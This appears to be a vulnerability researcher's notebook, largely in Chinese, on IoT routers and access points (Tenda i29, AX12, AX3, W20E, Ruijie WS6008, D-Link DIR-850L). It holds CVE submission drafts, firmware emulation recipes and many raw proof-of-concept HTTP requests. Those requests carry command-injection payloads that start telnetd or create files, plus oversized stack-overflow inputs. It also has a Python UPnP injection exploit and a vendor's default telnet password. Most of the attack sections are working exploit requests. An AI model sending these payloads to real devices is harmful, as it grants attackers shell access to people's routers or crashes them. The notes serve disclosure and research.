__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/pingSet.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function pingSet.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


4
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the setPing function, a stack overflow may occur when the value of the ip parameter is excessively large and is passed to variable v19 using the sprintf function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/setPing.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function setPing.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

5
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the spdtstConfigAndStart function, a stack overflow may occur when the value of the ip parameter is excessively large and is passed to variable v41 using the sprintf function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/spdtstConfigAndStart.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function spdtstConfigAndStart

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


6
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the sysLogin function, after the validation of the username and password, the control flows into sub_414ECC. The value of the time parameter is passed to a stack variable using the sscanf function, potentially leading to a stack overflow.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/sysLogin.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function sysLogin

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

7
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the sysScheduleRebootSet function, the parameter v8 represents the value from rebootDate. The absence of special character filtering in v8, when concatenated into the parameters of the do_execute_cmd function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/sysScheduleRebootSet-2.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a command injection vulnerability via the function sysScheduleRebootSet.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

8
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the sysScheduleRebootSet function, the parameter v9 represents the value from rebootTime. If the length of v9 is excessively long, the memcpy function could result in a stack overflow.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/sysScheduleRebootSet.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function sysScheduleRebootSet

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd

9
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the sysTimeInfoSet function, a stack overflow may occur when the value of the time parameter is passed to a stack variable using the sscanf function.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/sysTimeInfoSet.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function sysTimeInfoSet

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


10
__Vulnerability type__
Buffer Overflow

Command injection/Buffer Overflow
__Vendor of the product(s)__
tenda
__Product__
Tenda i29 v1.0 V1.0.0.5 and Tenda i29 v1.0 V1.0.0.2

__Impact__
Denial of Service

Code Execution/Denial of Service
__Affected component(s)__
In the wifiRadioSetIndoor function, a stack overflow may occur when the value of the bandwidth parameter is stored in v35 and then concatenated and passed to v39 using the sprintf function, especially when the value is excessively large.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/i29/wifiRadioSetIndoor.md
__Suggested description of the vulnerability for use in the CVE__
Tenda i29 v1.0 V1.0.0.5 and V1.0.0.2  was discovered to contain a stack overflow via the function wifiRadioSetIndoor

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd


### WS6008

1
__Vulnerability type__
Command injection

Command injection/Buffer Overflow
__Vendor of the product(s)__
Ruijie
__Product__
WS6008
v1.x v2.x AC_RGOS11.9(6)W3B2_G2C6-01_10221911

WS6108
v1.x AC_RGOS11.9(6)W3B2_G2C6-01_10221911

__Impact__
Code Execution

Code Execution/Denial of Service
__Affected component(s)__
In the downFiles function in the file.lua, there is a lack of filtering and validation for params.list, allowing arbitrary characters to be input. This results in command concatenation, leading to the execution of arbitrary commands.
__Attack vector(s)__
https://github.com/ef4tless/vuln/blob/master/iot/WS6008-WS6108/1.md
__Suggested description of the vulnerability for use in the CVE__
Ruijie WS6008 v1.x v2.x AC_RGOS11.9(6)W3B2_G2C6-01_10221911 and WS6108 v1.x AC_RGOS11.9(6)W3B2_G2C6-01_10221911  was discovered to contain a command injection vulnerability via the function downFiles.

__Discoverer(s)/Credits__
E4L4@TalentSec Co.,Ltd



## 设备资产收集

### dlink

DIR-830L

DIR-895L

DIR-890L

DIR-885L

DIR-880L

[DIR-850L](javascript:void(0);)

DIR-826L

DIR-820L

DIR-816L

DIR-810L





参考文章：https://mp.weixin.qq.com/s/9mmccpJVYOvib_af6DAOow





DIR-859

https://medium.com/@s1kr10s/d-link-dir-859-unauthenticated-information-disclosure-en-faf1a9a13f3f







# 漏洞挖掘记录 ⛏️

## cisco RV340(1.0.03.29 )

img固件，openwrt开发

7zip提取ubi镜像，将得到的ubi格式img用binwalk进行解压

依次启动nginx服务

```Bash
/etc/init.d/boot boot
generate_default_cert
/etc/init.d/confd start
/etc/init.d/nginx start
```

## tenda w30e

似乎固件内没有完整的web页面文件，暂且搁置😢



漏洞点功能一般是在httpd

```shell
cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static bin/httpd

#qemu启动httpd程序目，并开启调试端口
sudo chroot . ./qemu-arm-static -g 1234 ./bin/httpd


#查看可执行程序需要的动态链接库
readelf -d ./bin/httpd | grep NEEDED
#列出所有的函数名，与要寻找的函数对比
nm -D ./lib/libcommon.so

```

## tenda W20E(v15.11.0.6)

- qemu-arm-static可以直接使用**, **链接`webroot_ro`到`/webroot`
- 然后发现httpd无法监听80端口, 显示g_lan_ip=0.
- IDA和查看webroot_ro发现default.cfg中存了g_lan_ip, 为非零值, GetValue函数负责读取该文件. 
- 进到libcommon.so.0发现该函数和cfmd进程通信获取的该数值, 而cfmd的启动又需要mtd设备等等,  于是**自己写一个GetValue函数进行hook, 直接使用文件读取**: https://pastebin.ubuntu.com/p/8tQXJHQd3h/
- 查看`/lib`下的libc, 发现是uClibc, 编译参考[这里](https://iotsec-zone.com/article?id=202#4、Netgear  R8300固件模拟（qemu-user）):

```Bash
#compile lib.so
LD_LIBRARY_PATH=/root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/lib
apt install libelf-dev:i386  
ln -s /root/tools/IOT/am-toolchains/brcm-arm-sdk/hndtools-arm-linux-2.6.36-uclibc-4.5.3/bin/arm-uclibc-gcc /bin/ugcc
ugcc -shared -fPIC -Wall getvalue.c -o getvalue.so
#in chroot env:
./qemu-arm-static -E LD_PRELOAD=/getvalue.so /bin/httpd
```

- 发现无法登陆, 什么密码都不行. 于是找到登陆函数`authSecurityHandler`****patch跳过密码strcmp.
- 叕发现网页卡住了无法显示设置的选项和按钮,安装gdb-multiarch调试了下. 在网页卡住时ctrl+c中断后又继续运行, 就不卡了, 还显示`ucloud_p_sem: syscall interrupt`, **patch了ucloud_p_sem函数.**
- 某些poc就是在乱写, 发现在`parseFirstLine`函数中有URI too big的2048长度限制, 把一些栈溢出的长度改在这个限制之内即可验证. 



## totolink A7000R\NR1800X\X5000R

通过github Action环境的docker+qemu-system系统模式搭建：

1.docker中安装qemu-system-mipsel，需要提前将固件文件系统上传到qemu启动的镜像文件中(本地使用tap起qemu将文件系统scp过去，或者别的方式也可以)

2.编写sh脚本实现qemu-system-mipsel自动登录

3.dockerfile编写安装需要的依赖

sh脚本(别的系统需要修改为对应系统名)

```Bash
cd /root/
/usr/bin/expect<<EOF
set timeout 10000

spawn qemu-system-mipsel -M malta -kernel vmlinux-3.2.0-4-4kc-malta -hda debian_wheezy_mipsel_standard.qcow2 -append "root=/dev/sda1 console=tty0" -net nic \
    -net user,hostfwd=tcp::80-:80 -nographic

expect "debian-mipsel login:"
send "root\r"

#expect "root@debian-mipsel:~# "
#send "echo 0 > /proc/sys/kernel/randomize_va_space\r"

expect "Password:"
send "root\r"

expect "root@debian-mipsel:~# "
send "mount -o bind /dev ./squashfs-root/dev && mount -t proc /proc ./squashfs-root/proc\r"

expect "root@debian-mipsel:~# "
send "chroot squashfs-root/ /bin/sh\r"

expect "# "
send "ifconfig\r"

expect "# "
send "./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf\r"
expect "# "

expect eof
EOF
#cd /root/squashfs-root
#./usr/sbin/lighttpd -f ./lighttp/lighttpd.conf
sleep infinity;
```

Dockerfile

```Bash
FROM ubuntu:16.04

RUN apt update \
    && apt install -y qemu-system-mipsel \
    && apt install -y xz-utils \
    && apt install -y net-tools \
    && apt install -y expect \
    && apt install -y bridge-utils uml-utilities openssh-server

COPY debian_wheezy_mipsel_standard.qcow2 /root/debian_wheezy_mipsel_standard.qcow2

COPY vmlinux-3.2.0-4-4kc-malta /root/vmlinux-3.2.0-4-4kc-malta

COPY start.sh /root/start.sh

CMD [ "/bin/sh", "-c", "/root/start.sh" ]
```

构建好docker后，就可以将容器上传到自己的github仓库

然后exploit_db中使用的dockerfile可以直接这样

```Bash
FROM xxx/xxx:version
```

这样就能解决github action中跑docker，同时，docker上运行qemu-system的各种问题



## tplink ER5120G

CVE-2023-43138	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868n存在命令注入漏洞，攻击者在认证后添加NAPT规则，且规则名称带有注入点。
CVE-2023-43137	TPLINK TL-ER5120G 4.0 2.0.0 Build 210817 Rel.80868n存在命令注入漏洞，攻击者在认证后添加ACL规则，规则名称参数存在注入点。

CVE-2023-43135    TP-LINK ER5120G 4.0 2.0.0 Build 210817 Rel.80868n中存在未授权访问漏洞，攻击者无需身份验证即可获取设备敏感信息，获取用户令牌，最终登录设备后台管理。





## dlink 900WO



## tplink IP43AN









## ruijie WS6008_WS6108



/tmp/html/web/routers/common/system/file.lua   downFiles

sbin/auto_route/routelib.lua  routelib.get_pub_network_intf_and_sip



```shell
cd '/data/sourcedir'
rm -f '/tmp/vsd/0/destination.tar'
tar -cf '/tmp/vsd/0/destination.tar' 'file1.txt' 'file2.txt'
sync
```



```http
POST /web/init.lua/common.system.file/downFiles HTTP/1.1
Accept: */*
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9
Content-Length: 44
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
Cookie: LOCAL_LANG_COOKIE=zh; UI_LOCAL_COOKIE=zh; SIDS=F1734C792A0F5152FF2BC70F48738AA1; login=1; mac=0074.9c0c.797b; oid=1.3.6.1.4.1.4881.1.3.1.1.115; hotback_num=128; MODE_LOCAL=0; main_ui_cookie=menu_file_manage
Host: 192.168.1.2
Origin: https://192.168.1.2
Referer: https://192.168.1.2/common/file/file-admin.htm
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36
X-Requested-With: XMLHttpRequest
Connection: close


params=%7B%22src%22%3A%22%2Fdata%22%2C%22dst%22%3A%221.tar%22%2C%22list%22%3A%5B%221%27%3Btelnetd%27%22%5D%7D
```



## datacon

https://xz.aliyun.com/t/5808#toc-0





uhttpd : 0x8052612/0x8051BF2

```
ustream_printf(cl_0->us, "Location: %s\r\n\r\n", string_1);
ustream_printf(cl_0->us, "%s: %s\r\n", v4, string_0);
```

odhcpd: 0x4AAB 

```
v10 = strcpy(addr4.s_addr, name)
```

0x5DBB

```
v96 = malloc(v95 + 1);
```

0x5F69

```c
v105 = realloc(*(v7 + 584), 4 * v104);
```







## dlink dir-850L

#### bug1

```http
POST /pigwidgeon.cgi HTTP/1.0

Host: shareport.local

Cookie: uid=aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa

Prefix: asasdaw

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close

Content-Type: application/x-www-form-urlencoded

Content-Length: 21
```



#### bug2

```http
GET /scandir.sgi?action=umnt&en=;telnetd -&path=aaa&where=bbb HTTP/1.0

Host: shareport.local

Cookie: uid=unUFIr9ia

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: none

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close
```



#### bug3

```http
POST /captcha.cgi HTTP/1.1

Host: 192.168.0.1

Cookie: uid=xrU7UqR6kP

Content-Length: 9

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Platform: "Linux"

Sec-Ch-Ua-Mobile: ?0

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Content-Type: application/x-www-form-urlencoded

Accept: */*

Origin: https://192.168.0.1

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: cors

Sec-Fetch-Dest: empty

Referer: https://192.168.0.1/info/Login.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



DUMMY=YES
```

#### bug4

```HTTP
POST /fwupload.cgi HTTP/1.1

Host: shareport.local

Cookie: uid=qxPQB9fty

Content-Length: 9961750

Cache-Control: max-age=0

Sec-Ch-Ua: "Not=A?Brand";v="99", "Chromium";v="118"

Sec-Ch-Ua-Mobile: ?0

Sec-Ch-Ua-Platform: "Linux"

Upgrade-Insecure-Requests: 1

Origin: https://shareport.local

Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryOtYaEb8JA6svPVR2

User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.90 Safari/537.36

Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7

Sec-Fetch-Site: same-origin

Sec-Fetch-Mode: navigate

Sec-Fetch-User: ?1

Sec-Fetch-Dest: document

Referer: https://shareport.local/UpdateFirmware.html

Accept-Encoding: gzip, deflate, br

Accept-Language: en-US,en;q=0.9

Connection: close



------WebKitFormBoundaryOtYaEb8JA6svPVR2

Content-Disposition: form-data; name="select_Folder_a"; filename="EW_3.0(1)B11P226_EW1200G_10211312_install_encypto.bin"

Content-Type: application/octet-stream



upgrade_crypt_v1!@2021Ïqã«íïë|~Í?U6¢þoþo º.zz}|26/,_0(
_3
------WebKitFormBoundaryOtYaEb8JA6svPVR2--


```

#### bug5

```python
import socket
from time import sleep


def exp(server, port, shell_file):
    print('\n[*] Connection {host}:{port}').format(host=server, port=port)
    con = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    request = "SUBSCRIBE /gena.cgi?service=" + str(shell_file) + " HTTP/1.0\n"
    request += "Host: " + str(server) + str(port) + "\n"
    request += "Callback: <http://192.168.0.2/>\n"
    request += "NT: upnp:event\n"
    request += "Timeout: Second-infinite Second-1800\n"
    request += "Accept-Encoding: gzip, deflate\n"
    request += "User-Agent: gupnp-universal-cp GUPnP/1.0.2 DLNADOC/1.50\n\n"
    sleep(1)
    print('[*] Sending Payload')
    con.connect((socket.gethostbyname(server),port))
    con.send(request.encode())
    results = con.recv(4096)

exp('192.168.0.1', 49152, '`touch /flag4`')
```



## dlink Dir-842

`socket(2, 2, 0)` 调用创建了一个IPv4(AF_INET，因为第一个参数是2)的流式套接字(SOCK_STREAM，因为第二个参数是2)，第三个参数指定的是使用默认的协议(通常是TCP)。

` 0x7F000001` 表示使用回环地址(127.0.0.1)

load_all_modules



## dlink dir-821 ca

固件加密



## tenda AX12

### bug1

0x42F69C

/goform/setMacFilterCfg



<img src="https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231121191829134.png" alt="image-20231121191829134" style="zoom:50%;" />

**poc**

```http
POST /goform/setMacFilterCfg HTTP/1.1
Host: 192.168.11.1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Content-Type: application/x-www-form-urlencoded; charset=UTF-8
X-Requested-With: XMLHttpRequest
Content-Length: 51
Origin: http://192.168.11.1
Connection: close
Referer: http://192.168.11.1/iptv.html?random=0.7642888131213508&
Cookie: password=7c90ed4e4d4bf1e300aa08103057ccbcmho1qw


macFilterType=black&deviceList=aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaac\r

```



### bug2 

0x43AF3C

goform/SetVirtualServerCfg



### bug3

0x43B3C4

goform/SetStaticRouteCfg



### bug4

0x43FDCC

goform/SetNetControlList





## tenda AX2

tenda通用telnet密码Fireitup
https://www.anquanke.com/post/id/283630#h3-2
AX12真机分析



## tenda AX9

bug1

0x42F69C

bug2

0x43AF3C

bug3

0x43B3C4

bug4

0x43FDCC



bug5

0x42C808



setModules/setDeviceInfo

![image-20231122140708612](https://e4l4pic.oss-cn-beijing.aliyuncs.com/image-20231122140708612.png)



bug6

0x430304 

goform/SetOnlineDevName



bug7

0x43FBBC

goform/SetNetControlList



bug8

0x43FA38

goform/SetNetControlList


这个路由器主要读取配置文件完成网络服务配置，可以写在文件系统里

/etc/config/network
```c
config interface 'lookback'
        option ifname 'lo'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.0.0.1'
 
config globals 'globals'
 
config interface 'lan'
        option type 'bridge'
        option proto 'static'
        option ipaddr '127.0.0.1'
        option netmask '255.255.255.0'
```

参考文章：
[Tenda Ax12 设备分析-安全客 - 安全资讯平台](https://www.anquanke.com/post/id/283630#h3-9)

## tenda AX3
arm架构，这个固件解压后带有符号表，基于gohead，etc->etc_ro webroot->webroot_ro那一套东西

```shell
sudo cp $(which qemu-arm-static) .
sudo chroot . ./qemu-arm-static ./bin/httpd
```

启动后发现卡住，和w20e一样的情况，由于没有报错大概率是进循环了

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231124193644.png)

改判断


然后找不到变量值，是因为缺少获取值的函数，需要hook一下，hook方式同w20e
劫持setvalue函数，编译得到如下hook.so
![[hook.so]]

```shell
sudo chroot . ./qemu-arm-static -E LD_PRELOAD=./hook.so ./bin/httpd
```

然后修复一下软连接，去etc/default.cfg里改ip，就能访问了，但是登录不了，应该要patch一下

## tenda i29
https://www.tendacn.com/download/detail-4574.html
https://www.tendacn.com/products/ceiling-ap.html

./usr/sbin/httpd --home /www --log stdout:2


/common/lang/w63ap/cn/translate.json?116748?0.31929846819422736 HTTP/1.1

```http
POST /goform/modules?0.021745560222136584 HTTP/1.1
Host: 192.168.3.2
User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0
Accept: application/json
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Content-Type: application/json
X-Requested-With: XMLHttpRequest
Content-Length: 110
Origin: http://192.168.3.2
Connection: close
Referer: http://192.168.3.2/login.html

{"sysLogin":{"username":"admin","password":"YWRtaW4=","logoff":false,"timeZone":9,"time":"2023;12;4;16;13;1"}}
```




```http
POST /goform/modules?0.021745560222136584 HTTP/1.1

Host: 192.168.3.2

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:120.0) Gecko/20100101 Firefox/120.0

Accept: application/json

Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2

Accept-Encoding: gzip, deflate, br

Content-Type: application/json

X-Requested-With: XMLHttpRequest

Content-Length: 119

Origin: http://192.168.3.2

Connection: close

Referer: http://192.168.3.2/login.html

Cookie: _:USERNAME:_=admin



{"sysScheduleRebootSet":{"rebootEn":"1","rebootType":"timing","rebootTime":"08:00","rebootDate":"7;\"$(telnetd) \""

}}
```




bug1 +
0x414ECC

```http
POST /goform/modules?0.7791553911913489 HTTP/1.1
Host: 192.168.0.254
Content-Length: 3235
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/login.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"sysLogin":{"username":"admin","password":"YWRtaW4=","logoff":false,"timeZone":9,"time":"2023;12;10;0;32;3411111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111"}}
```


bug2-3
0x418C9C
```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 309
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"sysScheduleRebootSet":{"rebootEn":true,"rebootType":"timing","rebootDate":"1","rebootTime":"11111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111:00"}}
```





```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 114
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"sysScheduleRebootSet":{"rebootEn":true,"rebootType":"timing","rebootDate":"$(touch /flag)","rebootTime":"3:00"}}
```

![image.png](https://e4l4pic.oss-cn-beijing.aliyuncs.com/20231210002823.png)


bug4
0x419D9C
```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 333
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"sysTimeInfoSet":{"time":"2023-12-10-0-41-48111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","timeInterval":"7200","type":"net","timeZone":"38"}}
```

bug5
41C288
```http
POST /goform/modules HTTP/1.1
Host: 192.168.0.254
Content-Length: 214
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

{"lanCfgSet":{"lanMac":"08:40:F3:D1:25:90","lanType":"static","lanIp":"192.168.0.254","lanMask":"255.255.255.0","lanGw":"0.0.0.01111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111","preDns":"0.0.0.0","altDns":"0.0.0.0","deviceName":"Access Point","ethMode":"auto"}}
```



bug6
41DA20
```http
POST /goform/modules?0.2672032995215783 HTTP/1.1
Host: 192.168.0.254
Content-Length: 68
Accept: application/json
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/113.0.5672.127 Safari/537.36
Content-Type: application/json
Origin: http://192.168.0.254
Referer: http://192.168.0.254/index.html
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9
Cookie: _:USERNAME:_=admin
Connection: close

